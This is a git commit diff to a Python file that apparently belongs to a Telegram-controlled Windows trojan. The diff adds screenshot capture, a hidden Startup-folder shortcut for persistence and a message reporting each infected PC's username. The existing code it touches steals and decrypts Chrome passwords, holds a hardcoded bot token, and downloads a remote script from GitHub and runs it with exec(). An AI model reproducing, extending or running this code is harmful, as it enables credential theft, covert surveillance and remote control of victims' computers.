cbe7d93840e8e695d151ef20f6415e7d5c370d89
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-11-06 18:08:24 +0300

    Update result_log.py

--- result_log.py
+++ result_log.py
@@ -13,6 +13,11 @@ import winshell
 import win32con
 import requests
 from bs4 import BeautifulSoup
+from PIL import ImageGrab
+import win32con
+import win32gui
+import win32api
+import win32com.client
 
 # Замените токен на свой токен бота
 bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U"
@@ -94,7 +99,7 @@ def get_chrome_passwords():
                      пароль: {DecryptedPassword}  
                      <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
                               '''
-                    # print(data)
+                    print(data)
                     f.write(data)
                     passwords.append(data)
 
@@ -113,24 +118,38 @@ def avto(message):
     try:
         current_program = os.path.abspath(sys.argv[0])
         bot.send_message(message.chat.id, current_program)
+
+        # Создаем папку для копии программы
         user_folder = os.path.expanduser("~")
         copy_folder = os.path.join(user_folder, "MyProgram")
         os.makedirs(copy_folder, exist_ok=True)
+
+        # Копируем программу в папку
         shutil.copy(current_program, copy_folder)
+
+        # Создаем ярлык
         shortcut_name = "hostser.lnk"
         shortcut_path = os.path.join(user_folder, shortcut_name)
+
+        # Инициализация COM
+        win32com.client.Dispatch("WScript.Shell")  # <--- Добавили инициализацию COM
+
+        # Используем winshell для создания ярлыка
         with winshell.shortcut(shortcut_path) as shortcut:
             shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
             shortcut.show_cmd = win32con.SW_HIDE
             shortcut.icon = (None, 0)
+
+        # Добавляем ярлык в автозагрузку
         startup_folder = winshell.startup()
         startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
         shutil.copy(shortcut_path, startup_shortcut_path)
+
         bot.send_message(message.chat.id, "YSPESHNO DOBAVIL V AVTOZAPUSK!")
     except Exception as e:
         bot.send_message(message.chat.id, f"OSHIBKA PRI DOBALENII V AVTOZAPUSK: {e}")
 
-@bot.message_handler(commands=['tg_grab'])
+@bot.message_handler(commands=['tggrab'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
     url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/stal.py'
@@ -141,7 +160,7 @@ def handle_archive_and_send(message):
     exec(text_without_tags)
     bot.send_message(chat_id, "ARHIVASIA I OTPRAVKA ZAVESHENU.")
 
-@bot.message_handler(commands=['get_passwords'])
+@bot.message_handler(commands=['pass'])
 def send_passwords(message):
     passwords = get_chrome_passwords()
     if passwords:
@@ -150,5 +169,31 @@ def send_passwords(message):
     else:
         bot.send_message(message.chat.id, "Ошибка при получении паролей.")
 
-# Запускаем бота
-bot.infinity_polling()
+@bot.message_handler(commands=['ping'])
+def send_screenshot(message):
+    try:
+        # Делаем скриншот
+        screenshot = ImageGrab.grab()
+
+        # Сохраняем скриншот в файл
+        screenshot_path = "screenshot.png"
+        screenshot.save(screenshot_path)
+
+        # Отправляем скриншот в Telegram
+        with open(screenshot_path, "rb") as file:
+            bot.send_photo(chat_id, file)
+
+        # Удаляем временный файл скриншота
+        os.remove(screenshot_path)
+
+        bot.send_message(message.chat.id, "Скриншот отправлен!")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Ошибка при создании скриншота: {e}")
+def send_message_on_start():
+    username = os.getlogin()
+    bot.send_message(chat_id, f"Подключен пк: {username}")
+    bot.send_message(chat_id, "КОМАНДЫ: '\n' /ping - скриншот '\n' /pass - пассы '\n' /avto - потом'\n'/tggrab - потом ")
+
+send_message_on_start()
+bot.polling()
